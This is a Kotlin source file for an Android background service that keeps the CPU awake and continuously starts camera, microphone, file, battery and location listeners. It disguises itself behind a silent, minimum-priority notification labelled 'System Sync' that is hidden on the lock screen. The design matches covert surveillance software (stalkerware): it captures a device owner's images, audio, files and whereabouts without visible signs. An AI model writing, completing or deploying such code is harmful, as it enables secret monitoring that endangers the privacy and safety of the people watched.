package com.example.sentry.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat

class SentryPersistentService : Service() {

    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startAsForeground()

        // Acquire partial wakelock so CPU keeps running when phone screen is locked
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sentry::CameraWakeLock")?.apply {
                acquire(24 * 60 * 60 * 1000L) // 24h safety timeout
            }
        } catch (_: Exception) {
        }

        // Start background Camera2, Microphone, Battery Telemetry, File Explorer, and Location listeners
        BackgroundCameraManager.startListening(applicationContext)
        BackgroundAudioManager.startListening(applicationContext)
        BatteryTelemetryManager.startSync(applicationContext)
        BackgroundFileManager.startListening(applicationContext)
        BackgroundLocationManager.startListening(applicationContext)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Re-ensure background listeners are active
        BackgroundCameraManager.startListening(applicationContext)
        BackgroundAudioManager.startListening(applicationContext)
        BatteryTelemetryManager.startSync(applicationContext)
        BackgroundFileManager.startListening(applicationContext)
        BackgroundLocationManager.startListening(applicationContext)
        return START_STICKY
    }

    private fun startAsForeground() {
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Sync")
            .setContentText("Syncing in background")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)
            .setAutoCancel(false)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var flags = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val hasCamera = androidx.core.content.ContextCompat.checkSelfPermission(
                    this, android.Manifest.permission.CAMERA
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED
                val hasMic = androidx.core.content.ContextCompat.checkSelfPermission(
                    this, android.Manifest.permission.RECORD_AUDIO
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED
                val hasLocation = androidx.core.content.ContextCompat.checkSelfPermission(
                    this, android.Manifest.permission.ACCESS_FINE_LOCATION
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
                        androidx.core.content.ContextCompat.checkSelfPermission(
                            this, android.Manifest.permission.ACCESS_COARSE_LOCATION
                        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

                if (hasCamera) flags = flags or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                if (hasMic) flags = flags or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                if (hasLocation) flags = flags or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            try {
                startForeground(NOTIFICATION_ID, notification, flags)
            } catch (_: SecurityException) {
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } catch (_: Exception) {
                    startForeground(NOTIFICATION_ID, notification)
                }
            } catch (_: Exception) {
                startForeground(NOTIFICATION_ID, notification)
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Sync",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background synchronization service"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        try {
            wakeLock?.release()
        } catch (_: Exception) {
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val CHANNEL_ID = "sentry_silent_channel_v2"
        private const val NOTIFICATION_ID = 1001

        fun startService(context: Context) {
            try {
                val intent = Intent(context, SentryPersistentService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (_: Exception) {
            }
        }

        // Silent location sync - does not post intrusive banner or mini-map notifications
        fun updateLocationNotification(context: Context, address: String, lat: Double, lon: Double) {
            // Intentionally silent - no big picture map or popup notification
        }
    }
}
